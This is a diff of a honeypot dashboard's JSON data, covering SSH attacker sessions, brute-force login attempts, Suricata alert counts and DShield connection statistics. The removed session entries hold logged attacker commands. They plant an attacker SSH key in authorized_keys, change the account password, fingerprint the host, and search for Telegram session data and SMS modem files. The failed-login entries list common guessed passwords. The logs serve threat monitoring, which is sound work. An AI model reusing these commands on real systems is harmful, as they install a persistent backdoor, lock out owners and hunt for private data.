-          "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
-          "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
-          "ls -lh $(which ls)",
-          "which ls"
-        ]
-      },
-      {
-        "ip": "172.173.200.62",
-        "username": "teste",
-        "password": "teste2026",
-        "time": "21:34:40",
-        "commands": [
-          "cd ~; chattr -ia .ssh; lockr -ia .ssh",
-          "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-          "cat /proc/cpuinfo | grep name | wc -l",
-          "echo -e \"teste2026\\nqwAcLihZAnU5\\nqwAcLihZAnU5\"|passwd|bash",
-          "Enter new UNIX password: ",
-          "echo \"teste2026\\nqwAcLihZAnU5\\nqwAcLihZAnU5\\n\"|passwd",
-          "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
-          "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
-          "ls -lh $(which ls)",
-          "which ls"
-        ]
-      },
-      {
-        "ip": "144.48.6.26",
-        "username": "teste",
-        "password": "teste2026",
-        "time": "21:40:22",
-        "commands": [
-          "cd ~; chattr -ia .ssh; lockr -ia .ssh",
-          "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-          "cat /proc/cpuinfo | grep name | wc -l",
-          "echo -e \"teste2026\\ngH6nWKJPbqWP\\ngH6nWKJPbqWP\"|passwd|bash",
-          "Enter new UNIX password: ",
-          "echo \"teste2026\\ngH6nWKJPbqWP\\ngH6nWKJPbqWP\\n\"|passwd",
-          "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
-          "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
-          "ls -lh $(which ls)",
-          "which ls"
-        ]
-      },
-      {
-        "ip": "45.156.87.13",
-        "username": "root",
-        "password": "1qaz!QAZ",
-        "time": "23:06:54",
-        "commands": [
-          "uname -s -v -n -r -m"
-        ]
-      },
-      {
-        "ip": "176.193.7.2",
-        "username": "root",
-        "password": "admin",
-        "time": "23:23:53",
-        "commands": [
-          "/ip cloud print",
-          "ifconfig",
-          "uname -a",
-          "cat /proc/cpuinfo",
-          "ps | grep '[Mm]iner'",
-          "ps -ef | grep '[Mm]iner'",
-          "ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*",
-          "locate D877F783D5D3EF8Cs",
-          "echo Hi | cat -n"
-        ]
-      }
-    ],
-    "recent_attempts": [
-      {
-        "time": "23:28:25",
-        "ip": "45.156.87.13",
-        "username": "niaoyun",
-        "password": "123456",
-        "success": false
-      },
-      {
-        "time": "23:28:26",
-        "ip": "45.123.110.70",
-        "username": "root",
-        "password": "dl123456",
-        "success": false
-      },
-      {
-        "time": "23:28:30",
-        "ip": "45.156.87.13",
-        "username": "debian",
-        "password": "qwerty",
-        "success": false
-      },
-      {
-        "time": "23:28:36",
-        "ip": "45.156.87.13",
-        "username": "liyang",
-        "password": "123456",
-        "success": false
-      },
-      {
-        "time": "23:28:41",
-        "ip": "45.156.87.13",
-        "username": "dani",
-        "password": "dani",
-        "success": false
-      },
-      {
-        "time": "23:28:46",
-        "ip": "45.156.87.13",
-        "username": "openclaw",
-        "password": "1234",
-        "success": false
-      },
-      {
-        "time": "23:28:51",
-        "ip": "45.156.87.13",
-        "username": "user",
-        "password": "1234",
-        "success": false
-      },
-      {
-        "time": "23:28:57",
-        "ip": "45.156.87.13",
-        "username": "minecraft",
-        "password": "123123",
-        "success": false
-      },
-      {
-        "time": "23:29:02",
-        "ip": "45.156.87.13",
-        "username": "admin",
-        "password": "P@ssw0rd",
-        "success": false
-      },
-      {
-        "time": "23:29:07",
-        "ip": "45.156.87.13",
-        "username": "admin",
-        "password": "Admin@123",
-        "success": false
-      },
-      {
-        "time": "23:29:12",
-        "ip": "45.156.87.13",
-        "username": "martin",
-        "password": "martin",
-        "success": false
-      },
-      {
-        "time": "23:29:17",
-        "ip": "45.156.87.13",
-        "username": "ts",
-        "password": "ts",
-        "success": false
-      },
-      {
-        "time": "23:29:22",
-        "ip": "45.156.87.13",
-        "username": "root",
-        "password": "aA123456",
-        "success": false
-      },
-      {
-        "time": "23:29:27",
-        "ip": "45.156.87.13",
-        "username": "admin1",
-        "password": "redhat",
-        "success": false
-      },
-      {
-        "time": "23:29:32",
-        "ip": "45.156.87.13",
-        "username": "deploy",
-        "password": "1234",
-        "success": false
-      },
-      {
-        "time": "23:29:37",
-        "ip": "45.156.87.13",
-        "username": "odoo17",
-        "password": "odoo",
-        "success": false
-      },
-      {
-        "time": "23:29:42",
-        "ip": "45.156.87.13",
-        "username": "root",
-        "password": "******",
-        "success": false
-      },
-      {
-        "time": "23:29:48",
-        "ip": "45.156.87.13",
-        "username": "root",
-        "password": "abc12345",
-        "success": false
-      },
-      {
-        "time": "23:29:53",
-        "ip": "45.156.87.13",
-        "username": "root",
-        "password": "abcd1234",
-        "success": false
-      },
-      {
-        "time": "23:29:58",
-        "ip": "45.156.87.13",
-        "username": "cloud",
-        "password": "cloud123!",
-        "success": false
-      }
-    ]
+    "attacker_sessions": [],
+    "recent_attempts": []
   },
   "suricata": {
-    "total_alerts": 919,
+    "total_alerts": 962,
     "alerts_by_severity": {
-      "2": 299,
-      "3": 619,
+      "2": 324,
+      "3": 637,
       "1": 1
     },
     "top_signatures": [
       [
         "ET INFO SSH-2.0-Go version string Observed in Network Traffic",
-        601
+        619
       ],
       [
         "ET SCAN Potential SSH Scan",
-        105
+        120
       ],
       [
         "ET DROP Dshield Block Listed Source group 1",
-        63
-      ],
-      [
-        "ET CINS Active Threat Intelligence Poor Reputation IP group 187",
-        16
+        68
       ],
       [
         "ET DROP Spamhaus DROP Listed Traffic Inbound group 7",
-        15
+        17
+      ],
+      [
+        "ET CINS Active Threat Intelligence Poor Reputation IP group 187",
+        17
       ],
       [
         "ET DROP Spamhaus DROP Listed Traffic Inbound group 39",
@@ -947,7 +81,11 @@
       ],
       [
         "176.53.159.196",
-        62
+        63
+      ],
+      [
+        "45.156.87.13",
+        61
       ],
       [
         "2.57.122.168",
@@ -962,175 +100,171 @@
         43
       ],
       [
-        "92.118.39.49",
+        "139.19.117.197",
         38
       ],
       [
-        "139.19.117.197",
-        36
-      ],
-      [
-        "45.156.87.13",
-        32
+        "92.118.39.49",
+        38
       ]
     ],
     "recent_alerts": [
       {
-        "time": "23:17:16",
+        "time": "23:46:55",
         "severity": 3,
         "signature": "ET INFO SSH-2.0-Go version string Observed in Network Traffic",
-        "src_ip": "195.178.110.232",
+        "src_ip": "45.156.87.13",
         "dest_port": 22
       },
       {
-        "time": "23:17:21",
+        "time": "23:48:11",
         "severity": 2,
         "signature": "ET SCAN Potential SSH Scan",
         "src_ip": "45.156.87.13",
         "dest_port": 22
       },
       {
-        "time": "23:17:55",
-        "severity": 3,
-        "signature": "ET INFO SSH-2.0-Go version string Observed in Network Traffic",
-        "src_ip": "116.182.13.167",
-        "dest_port": 22
-      },
-      {
-        "time": "23:17:58",
-        "severity": 3,
-        "signature": "ET INFO SSH-2.0-Go version string Observed in Network Traffic",
-        "src_ip": "91.92.40.7",
-        "dest_port": 22
-      },
-      {
-        "time": "23:18:17",
+        "time": "23:48:57",
         "severity": 3,
         "signature": "ET INFO SSH-2.0-Go version string Observed in Network Traffic",
         "src_ip": "45.156.87.13",
         "dest_port": 22
       },
       {
-        "time": "23:19:23",
+        "time": "23:50:15",
         "severity": 2,
         "signature": "ET SCAN Potential SSH Scan",
         "src_ip": "45.156.87.13",
         "dest_port": 22
       },
       {
-        "time": "23:20:19",
+        "time": "23:51:00",
         "severity": 3,
         "signature": "ET INFO SSH-2.0-Go version string Observed in Network Traffic",
         "src_ip": "45.156.87.13",
         "dest_port": 22
       },
       {
-        "time": "23:21:25",
+        "time": "23:51:02",
         "severity": 2,
-        "signature": "ET SCAN Potential SSH Scan",
-        "src_ip": "45.156.87.13",
-        "dest_port": 22
-      },
-      {
-        "time": "23:21:31",
-        "severity": 2,
-        "signature": "ET DROP Spamhaus DROP Listed Traffic Inbound group 43",
-        "src_ip": "193.26.115.137",
+        "signature": "ET DROP Spamhaus DROP Listed Traffic Inbound group 7",
+        "src_ip": "45.142.154.10",
         "dest_port": 8000
       },
       {
-        "time": "23:22:21",
-        "severity": 3,
-        "signature": "ET INFO SSH-2.0-Go version string Observed in Network Traffic",
-        "src_ip": "45.156.87.13",
-        "dest_port": 22
-      },
-      {
-        "time": "23:23:28",
-        "severity": 2,
-        "signature": "ET SCAN Potential SSH Scan",
-        "src_ip": "45.156.87.13",
-        "dest_port": 22
-      },
-      {
-        "time": "23:24:24",
-        "severity": 3,
-        "signature": "ET INFO SSH-2.0-Go version string Observed in Network Traffic",
-        "src_ip": "45.156.87.13",
-        "dest_port": 22
-      },
-      {
-        "time": "23:25:31",
-        "severity": 2,
-        "signature": "ET SCAN Potential SSH Scan",
-        "src_ip": "45.156.87.13",
-        "dest_port": 22
-      },
-      {
-        "time": "23:26:27",
-        "severity": 3,
-        "signature": "ET INFO SSH-2.0-Go version string Observed in Network Traffic",
-        "src_ip": "45.156.87.13",
-        "dest_port": 22
-      },
-      {
-        "time": "23:27:34",
-        "severity": 2,
-        "signature": "ET SCAN Potential SSH Scan",
-        "src_ip": "45.156.87.13",
-        "dest_port": 22
-      },
-      {
-        "time": "23:27:55",
+        "time": "23:51:02",
         "severity": 2,
         "signature": "ET DROP Dshield Block Listed Source group 1",
-        "src_ip": "65.49.1.228",
+        "src_ip": "45.142.154.10",
+        "dest_port": 8000
+      },
+      {
+        "time": "23:51:17",
+        "severity": 2,
+        "signature": "ET SCAN Potential SSH Scan",
+        "src_ip": "89.233.107.97",
         "dest_port": 22
       },
       {
-        "time": "23:28:30",
+        "time": "23:51:29",
         "severity": 3,
         "signature": "ET INFO SSH-2.0-Go version string Observed in Network Traffic",
-        "src_ip": "45.156.87.13",
+        "src_ip": "89.233.107.97",
         "dest_port": 22
       },
       {
-        "time": "23:29:36",
+        "time": "23:52:19",
         "severity": 2,
         "signature": "ET SCAN Potential SSH Scan",
         "src_ip": "45.156.87.13",
         "dest_port": 22
       },
       {
-        "time": "23:29:53",
-        "severity": 2,
-        "signature": "ET DROP Dshield Block Listed Source group 1",
-        "src_ip": "65.49.1.222",
+        "time": "23:53:04",
+        "severity": 3,
+        "signature": "ET INFO SSH-2.0-Go version string Observed in Network Traffic",
+        "src_ip": "45.156.87.13",
         "dest_port": 22
       },
       {
-        "time": "23:29:53",
-        "severity": 3,
-        "signature": "SURICATA Applayer Mismatch protocol both directions",
-        "src_ip": "65.49.1.222",
+        "time": "23:54:19",
+        "severity": 2,
+        "signature": "ET SCAN Potential SSH Scan",
+        "src_ip": "45.156.87.13",
         "dest_port": 22
+      },
+      {
+        "time": "23:55:07",
+        "severity": 3,
+        "signature": "ET INFO SSH-2.0-Go version string Observed in Network Traffic",
+        "src_ip": "45.156.87.13",
+        "dest_port": 22
+      },
+      {
+        "time": "23:55:50",
+        "severity": 3,
+        "signature": "ET INFO SSH-2.0-Go version string Observed in Network Traffic",
+        "src_ip": "176.53.159.196",
+        "dest_port": 22
+      },
+      {
+        "time": "23:56:20",
+        "severity": 2,
+        "signature": "ET SCAN Potential SSH Scan",
+        "src_ip": "45.156.87.13",
+        "dest_port": 22
+      },
+      {
+        "time": "23:57:12",
+        "severity": 3,
+        "signature": "ET INFO SSH-2.0-Go version string Observed in Network Traffic",
+        "src_ip": "45.156.87.13",
+        "dest_port": 22
+      },
+      {
+        "time": "23:58:22",
+        "severity": 2,
+        "signature": "ET SCAN Potential SSH Scan",
+        "src_ip": "45.156.87.13",
+        "dest_port": 22
+      },
+      {
+        "time": "23:59:16",
+        "severity": 3,
+        "signature": "ET INFO SSH-2.0-Go version string Observed in Network Traffic",
+        "src_ip": "45.156.87.13",
+        "dest_port": 22
+      },
+      {
+        "time": "23:59:37",
+        "severity": 2,
+        "signature": "ET DROP Dshield Block Listed Source group 1",
+        "src_ip": "64.62.197.29",
+        "dest_port": 8000
+      },
+      {
+        "time": "23:59:37",
+        "severity": 2,
+        "signature": "ET CINS Active Threat Intelligence Poor Reputation IP group 109",
+        "src_ip": "64.62.197.29",
+        "dest_port": 8000
       }
     ]
   },
   "dshield": {
-    "total_connections": 3926,
-    "unique_ips": 426,
+    "total_connections": 4352,
+    "unique_ips": 432,
     "top_src_ips": [
       [
         "91.92.40.37",
         783
       ],
       [
-        "139.99.74.35",
-        361
+        "45.156.87.13",
+        697
       ],
       [
-        "45.156.87.13",
+        "139.99.74.35",
         361
       ],
       [
@@ -1155,7 +289,7 @@
       ],
       [
         "176.53.159.196",
-        68
+        69
       ],
       [
         "14.63.196.175",
@@ -1165,21 +299,37 @@
     "top_dest_ports": [
       [
         "22",
-        3621
-      ],
-      [
-        "8443",
-        153
+        4036
       ],
       [
         "8000",
-        152
+        159
+      ],
+      [
+        "8443",
+        157
       ]
     ],
     "recent_connections": [
       {
-        "src_ip": "14.103.84.166",
+        "src_ip": "45.156.87.13",
         "dest_port": "22"
+      },
+      {
+        "src_ip": "45.156.87.13",
+        "dest_port": "22"
+      },
+      {
+        "src_ip": "45.156.87.13",
+        "dest_port": "22"
+      },
+      {
+        "src_ip": "45.156.87.13",
+        "dest_port": "22"
+      },
+      {
+        "src_ip": "31.59.160.12",
+        "dest_port": "8000"
       },
       {
         "src_ip": "45.156.87.13",
@@ -1202,7 +352,11 @@
         "dest_port": "22"
       },
       {
-        "src_ip": "59.38.131.149",
+        "src_ip": "45.156.87.13",
+        "dest_port": "22"
+      },
+      {
+        "src_ip": "45.123.110.70",
         "dest_port": "22"
       },
       {
@@ -1214,8 +368,8 @@
         "dest_port": "22"
       },
       {
-        "src_ip": "14.103.84.166",
-        "dest_port": "22"
+        "src_ip": "64.62.197.29",
+        "dest_port": "8000"
       },
       {
         "src_ip": "45.156.87.13",
@@ -1230,27 +384,7 @@
         "dest_port": "22"
       },
       {
-        "src_ip": "14.103.115.115",
-        "dest_port": "22"
-      },
-      {
         "src_ip": "45.156.87.13",
-        "dest_port": "22"
-      },
-      {
-        "src_ip": "45.156.87.13",
-        "dest_port": "22"
-      },
-      {
-        "src_ip": "65.49.1.222",
-        "dest_port": "22"
-      },
-      {
-        "src_ip": "45.156.87.13",
-        "dest_port": "22"
-      },
-      {
-        "src_ip": "14.103.84.166",
         "dest_port": "22"
       },
       {
